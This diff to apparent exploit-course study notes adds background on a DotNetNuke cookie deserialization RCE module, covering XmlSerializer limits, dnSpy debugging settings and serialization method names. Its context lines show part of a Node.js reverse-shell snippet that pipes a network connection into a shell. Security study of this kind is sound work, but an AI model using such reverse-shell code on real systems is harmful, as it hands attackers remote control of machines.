@@ -111,4 +111,14 @@ Module : The Bassmaster Plugin (Nodejs) :
      function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
      sh.stderr.pipe(client);});
 
+Module : DotNetNuke Cookie Deserialization RCE
+1. XmlSerializer Limitations
+        XmlSerializer is only able to serialize public properties and fields of an object.
+2. For better debugging experirence modify the debugging dll in dnSpy tool
+          [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations |
+           DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+3. XML Serialization & Deserialization method
+    XmlSerializer.serialize() and XmlSerializer.deserialize(reader)
+4. Java Serialization & Deserialization method
+    Deserialization : inputObjectStream.readObject() and Serialization: outputObjectStream.writeObject()
     
